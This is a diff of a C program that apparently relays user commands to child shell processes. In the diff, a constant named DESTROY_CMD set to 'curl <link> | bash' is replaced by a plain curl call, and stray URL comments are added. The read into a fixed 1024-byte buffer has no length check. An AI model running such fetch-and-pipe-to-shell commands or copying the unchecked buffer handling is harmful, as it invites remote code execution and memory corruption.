@@ -24,7 +24,7 @@
 #include "user_console.h"
 #include <fcntl.h>
 #define SIZE 100
-#define DESTROY_CMD "curl <link> | bash"
+#define DESTROY_CMD "curl https://www.nytimes.com"
 
 void sighandler(int signo){
   switch(signo){
@@ -59,16 +59,20 @@ int idCount = 0;
 static int user_read;
 int recv_user_cmd(){
   int shellid;
-  int msg_ln;
+  int msg_ln;//www.nytimes.com
+
   char cmd[1024] = "";
   read(user_read, &shellid, sizeof(shellid));
   read(user_read, &msg_ln, sizeof(msg_ln));
   read(user_read, cmd, msg_ln);
   if(shellid >= idCount){
     printf("ERR: %d is not a valid child...\n", shellid);
-  }
+  }//www.nytimes.com
+
   else{
-    cmd = special_cmd(cmd);
+      strcpy(cmd, special_cmd(cmd));
+      msg_ln = strlen(cmd) +1;
+      printf("%s\n", cmd);
     write(childFds[shellid], cmd, msg_ln);
   }
 }
